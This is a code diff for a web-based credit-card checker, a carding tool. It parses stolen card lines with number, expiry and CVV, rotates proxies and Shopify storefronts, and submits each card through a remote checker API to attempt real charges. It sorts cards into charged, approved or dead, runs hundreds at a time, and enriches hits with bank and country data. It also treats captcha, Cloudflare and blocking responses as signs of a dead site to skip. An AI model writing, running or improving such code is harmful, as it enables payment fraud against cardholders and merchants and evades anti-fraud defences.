+        function removeProxy(index) {
+            state.proxies.splice(index, 1);
+            renderProxies();
+            updateStats();
+            logDebug(`🗑️ Removed proxy #${index + 1}`, 'info');
+        }
+
+        async function retestProxy(index) {
+            const proxy = state.proxies[index];
+            if (!proxy) return;
+            
+            logDebug(`🔄 Retesting proxy: ${proxy.substring(0, 30)}...`, 'info');
+            const startTime = performance.now();
+            const result = await testProxy(proxy);
+            const endTime = performance.now();
+            const latency = (endTime - startTime).toFixed(1);
+            
+            if (result.status === 'alive') {
+                state.proxies[index] = { proxy: proxy, status: 'ALIVE', latency: latency + 'ms', added: new Date().toLocaleDateString() };
+                logDebug(`✅ Proxy ALIVE: ${proxy.substring(0, 30)}... - ${latency}ms`, 'success');
+                alert('✅ Proxy is ALIVE! Latency: ' + latency + 'ms');
+            } else {
+                state.proxies[index] = { proxy: proxy, status: 'DEAD', latency: 'N/A', added: new Date().toLocaleDateString() };
+                logDebug(`❌ Proxy DEAD: ${proxy.substring(0, 30)}...`, 'error');
+                alert('❌ Proxy is DEAD!');
+            }
+            renderProxies();
+            updateStats();
+        }
+
+        // ===== VALIDATE CARD =====
+        function isValidCard(line) {
+            const pattern = /(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})/;
+            if (pattern.test(line)) return true;
+            const parts = line.trim().split(/[|: ]+/);
+            if (parts.length >= 4) {
+                const card = parts[0].trim();
+                if (/^\d{15,16}$/.test(card)) return true;
+            }
+            return false;
+        }
+
+        // ===== PARSE CARD =====
+        function parseCardLine(line) {
+            const pattern = /(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})/;
+            const match = line.match(pattern);
+            if (match) {
+                let year = match[3];
+                if (year.length === 2) year = '20' + year;
+                return {
+                    card: match[1],
+                    expMonth: match[2],
+                    expYear: year,
+                    cvv: match[4],
+                    exp: match[2] + '/' + year,
+                    raw: `${match[1]}|${match[2]}|${match[3]}|${match[4]}`
+                };
+            }
+            const parts = line.trim().split(/[|: ]+/);
+            if (parts.length >= 4) {
+                let year = parts[2].trim();
+                if (year.length === 2) year = '20' + year;
+                return {
+                    card: parts[0].trim(),
+                    expMonth: parts[1].trim(),
+                    expYear: year,
+                    cvv: parts[3].trim(),
+                    exp: parts[1].trim() + '/' + year,
+                    raw: `${parts[0].trim()}|${parts[1].trim()}|${parts[2].trim()}|${parts[3].trim()}`
+                };
+            }
+            return null;
+        }
+
+        // ===== GET BIN INFO =====
+        async function getBinInfo(card) {
+            try {
+                const bin = card.slice(0, 6);
+                const response = await fetch(`https://bins.antipublic.cc/bins/${bin}`);
+                if (!response.ok) return { brand: '-', type: '-', level: '-', bank: '-', country: '-', flag: '' };
+                const data = await response.json();
+                return {
+                    brand: data.brand || '-',
+                    type: data.type || '-',
+                    level: data.level || '-',
+                    bank: data.bank || '-',
+                    country: data.country_name || '-',
+                    flag: data.country_flag || '',
+                    cardType: data.card_type || '-',
+                    prepaid: data.prepaid || false
+                };
+            } catch {
+                return { brand: '-', type: '-', level: '-', bank: '-', country: '-', flag: '' };
+            }
+        }
+
+        // ===== GET PRICE =====
+        function getPriceFromResponse(raw) {
+            try {
+                const price = raw.Price || raw.price || '-';
+                if (price !== '-' && price !== 0) {
+                    try {
+                        return parseFloat(String(price).replace('$', '').replace(',', '').trim());
+                    } catch { return 0; }
+                }
+                return 0;
+            } catch { return 0; }
+        }
+
+        // ===== IS SITE DEAD =====
+        function isSiteDead(responseMsg, gateway, price) {
+            if (!responseMsg) return true;
+            if (!gateway || gateway === "Unknown") return true;
+            if (!gateway.includes("Shopify")) return true;
+            const priceStr = String(price);
+            if (["-", "$-", "$0", "$0.0", "0", "$0.00"].includes(priceStr)) return true;
+            const r = responseMsg.toLowerCase();
+            const deadKeywords = [
+                'receipt id is empty', 'handle is empty', 'product id is empty',
+                'tax amount is empty', 'payment method identifier is empty',
+                'invalid url', 'error in 1st req', 'cloudflare', 'connection failed',
+                'timed out', 'access denied', 'tlsv1 alert', 'ssl routines',
+                'could not resolve', 'domain name not found',
+                'name or service not known', 'openssl ssl_connect',
+                'empty reply from server', 'httperror504', 'http error',
+                'timeout', 'unreachable', 'ssl error',
+                '502', '503', '504', 'bad gateway', 'service unavailable',
+                'gateway timeout', 'network error', 'connection reset',
+                'failed to detect product', 'failed to create checkout',
+                'failed to tokenize card', 'failed to get proposal data',
+                'submit rejected', 'handle error', 'http 404',
+                'delivery_delivery_line_detail_changed', 'delivery_address2_required',
+                'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
+                'site dead', 'captcha_required', 'captcha required',
+                'site errors', 'not supported', 'unsupported',
+                'invalid site', 'connection refused', 'forbidden',
+                'no response', 'host not found', 'domain not found',
+                'could not connect', 'connection error', 'request timeout',
+                'gateway error', 'internal server error', 'server error',
+                'page not found', 'not found', 'http 500', 'http 502',
+                'http 503', 'http 504', 'cloudflare error', 'cf-error',
+                'cf-ray', 'challenge required', 'blocked', 'access blocked'
+            ];
+            for (const kw of deadKeywords) {
+                if (r.includes(kw)) return true;
+            }
+            return false;
+        }
+
+        // ================================================================
+        // 🔥 FIXED: CHECK CARD - Handles objects AND strings
+        // ================================================================
+        async function checkCard(card, site, proxy) {
+            // 🔥 FIX: Handle site as object or string
+            if (typeof site === 'object' && site !== null) {
+                site = site.url || site.toString();
+            }
+            if (typeof site !== 'string') {
+                site = String(site);
+            }
+            
+            const startTime = Date.now();
+            logDebug(`🔍 Checking: ${maskCard(card)} on ${site}`, 'info');
+            
+            try {
+                const parts = card.split('|');
+                if (parts.length !== 4) {
+                    logDebug(`❌ Invalid format: ${card}`, 'error');
+                    return { status: 'Invalid', message: 'Invalid format', card: card };
+                }
+                
+                if (!site.startsWith('http')) site = 'https://' + site;
+                
+                let proxyStr = proxy;
+                if (proxy) {
+                    if (typeof proxy === 'object' && proxy !== null) {
+                        proxyStr = proxy.proxy || proxy.toString();
+                    }
+                    if (typeof proxyStr !== 'string') {
+                        proxyStr = String(proxyStr);
+                    }
+                    const proxyParts = proxyStr.split(':');
+                    if (proxyParts.length === 4) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+                    } else if (proxyParts.length === 2) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
+                    }
+                }
+                if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+                
+                const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
+                const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${card}`;
+                logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
+                
+                const response = await fetch(url, {
+                    headers: {
+                        'Accept': 'application/json',
+                        'User-Agent': CONFIG.ANDROID_UA,
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+                
+                const elapsed = Date.now() - startTime;
+                logDebug(`⏱️ Response time: ${elapsed}ms`, 'info');
+                
+                if (!response.ok) {
+                    logDebug(`❌ HTTP ${response.status}: ${response.statusText}`, 'error');
+                    return { status: 'Site Error', message: `HTTP ${response.status}`, card: card, retry: true };
+                }
+                
+                const raw = await response.json();
+                logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
+                
+                const responseMsg = raw.Response || raw.card_response || '';
+                const price = raw.Price || raw.price || '-';
+                const priceValue = getPriceFromResponse(raw);
+                const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
+                const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
+                
+                if (isSiteDead(responseMsg, gateway, priceDisplay)) {
+                    logDebug(`⚠️ Site is dead`, 'warning');
+                    return {
+                        status: 'Site Error',
+                        message: responseMsg || 'Site is dead',
+                        card: card,
+                        retry: true,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue
+                    };
+                }
+                
+                const r = responseMsg.toLowerCase();
+                if (r.includes('charged') || r.includes('order_placed') || 
+                    r.includes('thank you') || r.includes('payment successful')) {
+                    logDebug(`💎 CHARGED! ${maskCard(card)}`, 'success');
+                    return {
+                        status: 'Charged',
+                        message: responseMsg,
+                        card: card,
+                        site: site,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue,
+                        responseType: 'ORDER_PLACED'
+                    };
+                } else if (r.includes('approved') || r.includes('success') || 
+                    r.includes('insufficient_funds') || r.includes('insufficient funds') ||
+                    r.includes('invalid_cvv') || r.includes('incorrect_cvv') || 
+                    r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
+                    r.includes('invalid cvv') || r.includes('incorrect cvv') ||
+                    r.includes('invalid cvc') || r.includes('incorrect cvc') ||
+                    r.includes('incorrect_zip') || r.includes('incorrect zip') ||
+                    r.includes('cvv issue') || r.includes('3d') || r.includes('3d secure') ||
+                    r.includes('otp') || r.includes('verification required') ||
+                    r.includes('authenticate') || r.includes('authentication required') ||
+                    r.includes('challenge required') || r.includes('redirecting to bank') ||
+                    r.includes('bank verification') || r.includes('send code') ||
+                    r.includes('enter code') || r.includes('verify')) {
+                    logDebug(`✅ APPROVED! ${maskCard(card)}`, 'success');
+                    let respType = 'APPROVED';
+                    if (r.includes('insufficient_funds') || r.includes('insufficient funds')) respType = 'INSUFFICIENT_FUNDS';
+                    else if (r.includes('3d') || r.includes('3d secure') || r.includes('challenge required') || r.includes('redirecting to bank') || 
+                             r.includes('otp') || r.includes('verification required') || r.includes('authenticate')) respType = '3DS_REQUIRED';
+                    else if (r.includes('invalid_cvv') || r.includes('incorrect_cvv') || r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
+                             r.includes('cvv issue')) respType = 'CVV_ISSUE';
+                    return {
+                        status: 'Approved',
+                        message: responseMsg,
+                        card: card,
+                        site: site,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue,
+                        responseType: respType
+                    };
+                } else {
+                    logDebug(`❌ DECLINED: ${responseMsg.substring(0, 30)}`, 'error');
+                    return {
+                        status: 'Dead',
+                        message: responseMsg,
+                        card: card,
+                        site: site,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue,
+                        responseType: 'DEAD'
+                    };
+                }
+            } catch (error) {
+                const elapsed = Date.now() - startTime;
+                logDebug(`❌ EXCEPTION after ${elapsed}ms: ${error.message}`, 'error');
+                return {
+                    status: 'Site Error',
+                    message: error.message || 'API Error',
+                    card: card,
+                    retry: true
+                };
+            }
+        }
+
+        // ================================================================
+        // 🔥 FIXED: CHECK CARD WITH RETRY - Handles objects
+        // ================================================================
+        async function checkCardWithRetry(card, maxRetries = 2) {
+            if (state.sites.length === 0) {
+                logDebug(`❌ No sites available for ${maskCard(card)}`, 'error');
+                return { status: 'Site Error', message: 'No sites available', card: card };
+            }
+            if (state.proxies.length === 0) {
+                logDebug(`❌ No proxies available for ${maskCard(card)}`, 'error');
+                return { status: 'Site Error', message: 'No proxies available', card: card };
+            }
+            
+            for (let attempt = 0; attempt < maxRetries; attempt++) {
+                // 🔥 FIX: Extract URL from site object
+                const siteObj = state.sites[Math.floor(Math.random() * state.sites.length)];
+                const site = typeof siteObj === 'object' ? siteObj.url : siteObj;
+                
+                const proxyObj = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+                const proxy = typeof proxyObj === 'object' ? proxyObj.proxy : proxyObj;
+                
+                logDebug(`🔄 Attempt ${attempt + 1}/${maxRetries} for ${maskCard(card)}`, 'info');
+                const result = await checkCard(card, site, proxy);
+                if (!result.retry) return result;
+                if (attempt < maxRetries - 1) {
+                    logDebug(`⏳ Waiting 100ms before retry...`, 'info');
+                    await new Promise(r => setTimeout(r, 100));
+                }
+            }
+            logDebug(`❌ Max retries exceeded for ${maskCard(card)}`, 'error');
+            return { status: 'Site Error', message: 'Max retries exceeded', card: card };
+        }
+
+        // ================================================================
+        // 🔥 FIXED: TEST SITE WITH PRICE - Handles objects
+        // ================================================================
+        async function testSiteWithPrice(site, proxy) {
+            // 🔥 FIX: Handle site as object or string
+            if (typeof site === 'object' && site !== null) {
+                site = site.url || site.toString();
+            }
+            if (typeof site !== 'string') {
+                site = String(site);
+            }
+            
+            try {
+                if (!site.startsWith('http')) site = 'https://' + site;
+                
+                let proxyStr = proxy;
+                if (proxy) {
+                    if (typeof proxy === 'object' && proxy !== null) {
+                        proxyStr = proxy.proxy || proxy.toString();
+                    }
+                    if (typeof proxyStr !== 'string') {
+                        proxyStr = String(proxyStr);
+                    }
+                    const proxyParts = proxyStr.split(':');
+                    if (proxyParts.length === 4) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+                    } else if (proxyParts.length === 2) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
+                    }
+                }
+                if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+                
+                const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
+                const url = `${apiBase}/check?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}`;
+                const response = await fetch(url, {
+                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+                });
+                if (!response.ok) return { site: site, status: 'dead', price: 0 };
+                const raw = await response.json();
+                if (raw.valid === true) {
+                    const priceValue = getPriceFromResponse(raw);
+                    return { site: site, status: 'alive', price: priceValue };
+                } else if (raw.valid === false) {
+                    return { site: site, status: 'dead', price: 0 };
+                }
+                return { site: site, status: 'dead', price: 0 };
+            } catch { return { site: site, status: 'dead', price: 0 }; }
+        }
+
+        // ================================================================
+        // PROGRESS FILTERS
+        // ================================================================
+        document.querySelectorAll('#quickFilterContainer .progress-filter-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('#quickFilterContainer .progress-filter-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                quickFilter = this.dataset.filter;
+                renderQuickResults();
+            });
+        });
+
+        function renderQuickResults() {
+            let filtered = quickResults;
+            if (quickFilter === 'charged') filtered = quickResults.filter(r => r.status === 'Charged');
+            else if (quickFilter === 'approved') filtered = quickResults.filter(r => r.status === 'Approved');
+            else if (quickFilter === 'declined') filtered = quickResults.filter(r => r.status !== 'Charged' && r.status !== 'Approved');
+            if (filtered.length === 0) {
+                els.quickResultsList.innerHTML = `<div style="text-align:center;color:var(--text-dim);padding:20px;">No results for this filter</div>`;
+                return;
+            }
+            els.quickResultsList.innerHTML = filtered.map(r => {
+                const statusClass = (r.status === 'Charged' || r.status === 'Approved') ? 'approved' : 'dead';
+                return `<div class="result-item ${statusClass}">
+                    <span>${r.card || 'Unknown'}</span>
+                    <span>${r.price || '-'}</span>
+                    <span>${r.gateway || 'Unknown'}</span>
+                    <span class="status-badge ${statusClass}">${r.status}</span>
+                </div>`;
+            }).join('');
+        }
+
+        document.querySelectorAll('#massFilterContainer .progress-filter-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('#massFilterContainer .progress-filter-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                massFilter = this.dataset.filter;
+                renderMassResults();
+            });
+        });
+
+        function renderMassResults() {
+            let filtered = massResults;
+            if (massFilter === 'charged') filtered = massResults.filter(r => r.status === 'Charged');
+            else if (massFilter === 'approved') filtered = massResults.filter(r => r.status === 'Approved');
+            else if (massFilter === 'declined') filtered = massResults.filter(r => r.status !== 'Charged' && r.status !== 'Approved');
+            if (filtered.length === 0) {
+                els.massResultsList.innerHTML = `<div style="text-align:center;color:var(--text-dim);padding:20px;">No results for this filter</div>`;
+                return;
+            }
+            els.massResultsList.innerHTML = filtered.map(r => {
+                const statusClass = (r.status === 'Charged' || r.status === 'Approved') ? 'approved' : 'dead';
+                return `<div class="result-item ${statusClass}">
+                    <span>${r.card || 'Unknown'}</span>
+                    <span>${r.price || '-'}</span>
+                    <span>${r.gateway || 'Unknown'}</span>
+                    <span class="status-badge ${statusClass}">${r.status}</span>
+                </div>`;
+            }).join('');
+        }
+
+        // ================================================================
+        // HITS FILTERS
+        // ================================================================
+        document.querySelectorAll('.hit-filter-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.hit-filter-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                hitsFilter = this.dataset.filter;
+                renderFullHitsList();
+            });
+        });
+
+        // ================================================================
+        // QUICK CHECK - ULTRA FAST
+        // ================================================================
+        async function processQuickCheck() {
+            const total = quickCardsList.length;
+            const batchSize = 100;
+            
+            for (let i = quickCurrentIndex; i < total; i += batchSize) {
+                if (quickStopRequested || quickPaused) {
+                    while (quickPaused) {
+                        await new Promise(r => setTimeout(r, 100));
+                        if (quickStopRequested) break;
+                    }
+                    if (quickStopRequested) break;
+                }
+                
+                const batch = quickCardsList.slice(i, Math.min(i + batchSize, total));
+                logDebug(`📦 Quick batch ${Math.floor(i/batchSize)+1}: ${batch.length} cards`, 'info');
+                
+                const results = await Promise.all(batch.map(async (line) => {
+                    const cardData = parseCardLine(line);
+                    if (!cardData) return null;
+                    const result = await checkCardWithRetry(cardData.raw, 2);
+                    if (result.card && !result.card.includes('|')) {
+                        const parts = result.card.split('|');
+                        if (parts.length === 4) result.card = parts[0];
+                    }
+                    return result;
+                }));
+                
+                for (const result of results) {
+                    if (!result) continue;
+                    
+                    const cardNum = result.card || 'Unknown';
+                    const binInfo = await getBinInfo(cardNum);
+                    const fullCard = result.card || 'Unknown';
+                    
+                    if (result.status === 'Charged') {
+                        state.charged++;
+                        state.approved++;
+                        state.hits.unshift({
+                            card: cardNum,
+                            fullCard: fullCard,
+                            exp: result.exp || 'N/A',
+                            cvv: result.cvv || 'N/A',
+                            amount: result.price_value || 0,
+                            status: 'CHARGED',
+                            time: new Date().toLocaleTimeString(),
+                            date: new Date().toLocaleString(),
+                            type: result.gateway || 'Shopify Payments',
+                            responseType: result.responseType || 'ORDER_PLACED',
+                            gateway: result.gateway || 'Shopify Payments',
+                            price: result.price || '-',
+                            bank: binInfo.bank || '-',
+                            country: binInfo.country ? binInfo.country + ' ' + binInfo.flag : '-',
+                            brand: binInfo.brand || '-',
+                            cardType: binInfo.type || '-',
+                            cardLevel: binInfo.level || '-'
+                        });
+                    } else if (result.status === 'Approved') {
+                        state.approved++;
+                        state.hits.unshift({
+                            card: cardNum,
+                            fullCard: fullCard,
+                            exp: result.exp || 'N/A',
+                            cvv: result.cvv || 'N/A',
+                            amount: result.price_value || 0,
+                            status: 'APPROVED',
+                            time: new Date().toLocaleTimeString(),
+                            date: new Date().toLocaleString(),
+                            type: result.gateway || 'Shopify Payments',
+                            responseType: result.responseType || 'APPROVED',
+                            gateway: result.gateway || 'Shopify Payments',
+                            price: result.price || '-',
+                            bank: binInfo.bank || '-',
+                            country: binInfo.country ? binInfo.country + ' ' + binInfo.flag : '-',
+                            brand: binInfo.brand || '-',
+                            cardType: binInfo.type || '-',
+                            cardLevel: binInfo.level || '-'
+                        });
+                    } else {
+                        state.declined++;
+                    }
+                    state.totalHits++;
+                    quickResults.push(result);
+                }
+                
+                quickCurrentIndex = Math.min(i + batchSize, total);
+                const pct = Math.round((quickCurrentIndex / total) * 100);
+                els.quickProgressText.textContent = `${quickCurrentIndex}/${total} (${pct}%)`;
+                els.quickStatus.textContent = quickPaused ? '⏸️ Paused' : '🔄 Running';
+                els.quickStatus.className = `status-indicator ${quickPaused ? 'paused' : 'running'}`;
+                
+                renderQuickResults();
+                updateQuickFilterCounts();
+                updateStats();
+                renderHits();
+                
+                if (!quickStopRequested) await new Promise(r => setTimeout(r, 30));
+            }
+            
+            if (!quickStopRequested && quickCurrentIndex >= total) {
+                quickRunning = false;
+                updateQuickUI('stopped');
+                els.quickStatus.textContent = '✅ Complete!';
+                els.quickStatus.className = 'status-indicator complete';
+                els.quickProgressText.textContent = `${total}/${total} (100%)`;
+                renderQuickResults();
+                updateQuickFilterCounts();
+                logDebug(`✅ Quick check COMPLETE! ${total} cards processed`, 'success');
+            }
+        }
+
+        function updateQuickUI(status) {
+            els.quickCheckBtn.disabled = status === 'running' || status === 'paused';
+            els.quickPauseBtn.disabled = status !== 'running';
+            els.quickResumeBtn.disabled = status !== 'paused';
+            els.quickStopBtn.disabled = status === 'stopped' || status === 'complete';
+        }
+
+        els.quickCheckBtn.addEventListener('click', async function() {
+            const lines = els.quickCards.value.split('\n').filter(c => c.trim());
+            if (lines.length === 0) { alert('Please enter at least one card'); return; }
+            if (state.sites.length === 0) { alert('❌ No sites available! Upload sites first.'); return; }
+            if (state.proxies.length === 0) { alert('❌ No proxies available! Upload proxies first.'); return; }
+
+            const validCards = lines.filter(line => isValidCard(line));
+            if (validCards.length === 0) { alert('❌ No valid cards found! Use format: card|mm|yy|cvv'); return; }
+            if (validCards.length < lines.length) {
+                alert(`⚠️ Found ${validCards.length} valid cards out of ${lines.length} lines. Invalid lines ignored.`);
+            }
+
+            quickRunning = true; quickPaused = false; quickStopRequested = false;
+            quickCardsList = validCards; quickCurrentIndex = 0; quickResults = [];
+            els.quickResultsList.innerHTML = '';
+            
+            document.querySelectorAll('#quickFilterContainer .progress-filter-btn').forEach(b => b.classList.remove('active'));
+            document.querySelector('#quickFilterContainer .progress-filter-btn.all').classList.add('active');
+            quickFilter = 'all';
+            
+            updateQuickUI('running');
+            els.quickStatus.textContent = '🔄 Running';
+            els.quickStatus.className = 'status-indicator running';
+            els.quickProgressText.textContent = `0/${validCards.length}`;
+            updateQuickFilterCounts();
+            
+            logDebug(`🚀 Starting quick check with ${validCards.length} cards`, 'info');
+            await processQuickCheck();
+        });
+
+        els.quickPauseBtn.addEventListener('click', function() {
+            if (quickRunning && !quickPaused) {
+                quickPaused = true;
+                els.quickStatus.textContent = '⏸️ Paused';
+                els.quickStatus.className = 'status-indicator paused';
+                updateQuickUI('paused');
+                logDebug('⏸️ Paused', 'warning');
+            }
+        });
+
+        els.quickResumeBtn.addEventListener('click', function() {
+            if (quickRunning && quickPaused) {
+                quickPaused = false;
+                els.quickStatus.textContent = '🔄 Running';
+                els.quickStatus.className = 'status-indicator running';
+                updateQuickUI('running');
+                logDebug('▶️ Resumed', 'info');
+                processQuickCheck();
+            }
+        });
+
+        els.quickStopBtn.addEventListener('click', function() {
+            if (quickRunning) {
+                quickStopRequested = true;
+                quickPaused = false;
+                els.quickStatus.textContent = '⏹️ Stopping...';
+                els.quickStatus.className = 'status-indicator stopped';
+                updateQuickUI('stopped');
+                logDebug('⏹️ Stopped by user', 'warning');
+            }
+        });
+
+        els.quickClearBtn.addEventListener('click', function() {
+            if (quickRunning) {
+                if (!confirm('Stop current check and clear results?')) return;
+                quickStopRequested = true; quickPaused = false; quickRunning = false;
+            }
+            els.quickResultsList.innerHTML = '';
+            els.quickCards.value = '';
+            els.quickProgressText.textContent = '0/0';
+            els.quickStatus.textContent = '⏹️ Stopped';
+            els.quickStatus.className = 'status-indicator stopped';
+            updateQuickUI('stopped');
+            quickResults = [];
+            updateQuickFilterCounts();
+            logDebug('🗑️ Cleared quick results', 'info');
+        });
+
+        // ================================================================
+        // MASS CHECK - ULTRA FAST
+        // ================================================================
+        async function processMassCheck() {
+            const total = massCardsList.length;
+            const batchSize = 200;
+            
+            for (let i = massCurrentIndex; i < total; i += batchSize) {
+                if (massStopRequested || massPaused) {
+                    while (massPaused) {
+                        await new Promise(r => setTimeout(r, 100));
+                        if (massStopRequested) break;
+                    }
+                    if (massStopRequested) break;
+                }
+                
+                const batch = massCardsList.slice(i, Math.min(i + batchSize, total));
+                logDebug(`📦 Mass batch ${Math.floor(i/batchSize)+1}: ${batch.length} cards`, 'info');
+                
+                const results = await Promise.all(batch.map(async (line) => {
+                    const cardData = parseCardLine(line);
+                    if (!cardData) return null;
+                    const result = await checkCardWithRetry(cardData.raw, 2);
+                    if (result.card && !result.card.includes('|')) {
+                        const parts = result.card.split('|');
+                        if (parts.length === 4) result.card = parts[0];
+                    }
+                    return result;
+                }));
+                
+                for (const result of results) {
+                    if (!result) continue;
+                    
+                    const cardNum = result.card || 'Unknown';
+                    const binInfo = await getBinInfo(cardNum);
+                    const fullCard = result.card || 'Unknown';
+                    
+                    if (result.status === 'Charged') {
+                        state.charged++;
+                        state.approved++;
+                        state.hits.unshift({
+                            card: cardNum,
+                            fullCard: fullCard,
+                            exp: result.exp || 'N/A',
+                            cvv: result.cvv || 'N/A',
+                            amount: result.price_value || 0,
+                            status: 'CHARGED',
+                            time: new Date().toLocaleTimeString(),
+                            date: new Date().toLocaleString(),
+                            type: result.gateway || 'Shopify Payments',
+                            responseType: result.responseType || 'ORDER_PLACED',
+                            gateway: result.gateway || 'Shopify Payments',
+                            price: result.price || '-',
+                            bank: binInfo.bank || '-',
+                            country: binInfo.country ? binInfo.country + ' ' + binInfo.flag : '-',
+                            brand: binInfo.brand || '-',
+                            cardType: binInfo.type || '-',
+                            cardLevel: binInfo.level || '-'
+                        });
+                    } else if (result.status === 'Approved') {
+                        state.approved++;
+                        state.hits.unshift({
+                            card: cardNum,
+                            fullCard: fullCard,
+                            exp: result.exp || 'N/A',
+                            cvv: result.cvv || 'N/A',
+                            amount: result.price_value || 0,
+                            status: 'APPROVED',
+                            time: new Date().toLocaleTimeString(),
+                            date: new Date().toLocaleString(),
+                            type: result.gateway || 'Shopify Payments',
+                            responseType: result.responseType || 'APPROVED',
+                            gateway: result.gateway || 'Shopify Payments',
+                            price: result.price || '-',
+                            bank: binInfo.bank || '-',
+                            country: binInfo.country ? binInfo.country + ' ' + binInfo.flag : '-',
+                            brand: binInfo.brand || '-',
+                            cardType: binInfo.type || '-',
+                            cardLevel: binInfo.level || '-'
+                        });
+                    } else {
+                        state.declined++;
+                    }
+                    state.totalHits++;
+                    massResults.push(result);
+                }
+                
+                massCurrentIndex = Math.min(i + batchSize, total);
+                const pct = Math.round((massCurrentIndex / total) * 100);
+                els.massStatus.textContent = pct + '%';
+                els.massProgressFill.style.width = pct + '%';
+                els.massProgressText.textContent = `${massCurrentIndex}/${total} (${pct}%)`;
+                els.massStatusIndicator.textContent = massPaused ? '⏸️ Paused' : '🔄 Running';
+                els.massStatusIndicator.className = `status-indicator ${massPaused ? 'paused' : 'running'}`;
+                
+                let charged = 0, approved = 0, dead = 0;
+                massResults.forEach(r => {
+                    if (r.status === 'Charged') charged++;
+                    else if (r.status === 'Approved') approved++;
+                    else dead++;
+                });
+                els.massChargedCount.textContent = charged;
+                els.massApprovedCount.textContent = approved;
+                els.massDeadCount.textContent = dead;
+                
+                renderMassResults();
+                updateMassFilterCounts();
+                updateStats();
+                renderHits();
+                
+                if (!massStopRequested) await new Promise(r => setTimeout(r, 30));
+            }
+            
+            if (!massStopRequested && massCurrentIndex >= total) {
+                massRunning = false;
+                updateMassUI('stopped');
+                els.massStatusIndicator.textContent = '✅ Complete!';
+                els.massStatusIndicator.className = 'status-indicator complete';
+                els.massProgressText.textContent = `${total}/${total} (100%)`;
+                els.massStatus.textContent = '✅ Complete! (' + total + ' cards)';
+                els.massProgressFill.style.width = '100%';
+                renderMassResults();
+                updateMassFilterCounts();
+                logDebug(`✅ Mass check COMPLETE! ${total} cards processed`, 'success');
+            }
+        }
+
+        function updateMassUI(status) {
+            els.massStartBtn.disabled = status === 'running' || status === 'paused';
+            els.massPauseBtn.disabled = status !== 'running';
+            els.massResumeBtn.disabled = status !== 'paused';
+            els.massStopBtn.disabled = status === 'stopped' || status === 'complete';
+        }
+
+        els.browseBtn.addEventListener('click', () => els.fileInput.click());
+
+        els.fileInput.addEventListener('change', function(e) {
+            if (this.files.length) loadMassFile(this.files[0]);
+        });
+
+        els.dropZone.addEventListener('dragover', (e) => { e.preventDefault(); els.dropZone.classList.add('dragover'); });
+        els.dropZone.addEventListener('dragleave', () => { els.dropZone.classList.remove('dragover'); });
+        els.dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            els.dropZone.classList.remove('dragover');
+            if (e.dataTransfer.files.length) loadMassFile(e.dataTransfer.files[0]);
+        });
+        els.dropZone.addEventListener('click', () => els.fileInput.click());
+
+        function loadMassFile(file) {
+            if (!file.name.endsWith('.txt')) {
+                alert('Please upload a .txt file');
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const lines = e.target.result.split('\n').filter(l => l.trim());
+                const validCards = lines.filter(line => isValidCard(line));
+                
+                if (validCards.length === 0) {
+                    alert('❌ No valid cards found in file! Please use format: card|mm|yy|cvv');
+                    return;
+                }
+                
+                if (validCards.length < lines.length) {
+                    alert(`⚠️ Found ${validCards.length} valid cards out of ${lines.length} lines. Invalid lines ignored.`);
+                }
+                
+                massFileData = {
+                    filename: file.name,
+                    lines: validCards,
+                    total: validCards.length
+                };
+                
+                els.fileInfo.style.display = 'block';
+                els.fileNameDisplay.textContent = file.name;
+                els.fileCardCount.textContent = validCards.length;
+                els.fileTotalDisplay.textContent = validCards.length;
+                
+                els.massStartBtn.disabled = false;
+                els.massStartBtn.textContent = `🚀 START MASS CHECK (${validCards.length} cards)`;
+                
+                els.massResultsList.innerHTML = '';
+                els.massProgress.style.display = 'none';
+                els.massProgressText.textContent = `0/${validCards.length}`;
+                els.massStatusIndicator.textContent = '⏹️ Ready';
+                els.massStatusIndicator.className = 'status-indicator stopped';
+                updateMassUI('stopped');
+                massResults = [];
+                updateMassFilterCounts();
+                
+                logDebug(`📁 Loaded ${validCards.length} cards from ${file.name}`, 'info');
+                alert(`✅ File loaded! ${validCards.length} valid cards ready. Click "START MASS CHECK" to begin.`);
+            };
+            reader.readAsText(file);
+        }
+
+        els.massStartBtn.addEventListener('click', async function() {
+            if (!massFileData || massFileData.lines.length === 0) {
+                alert('Please upload a .txt file first!');
+                return;
+            }
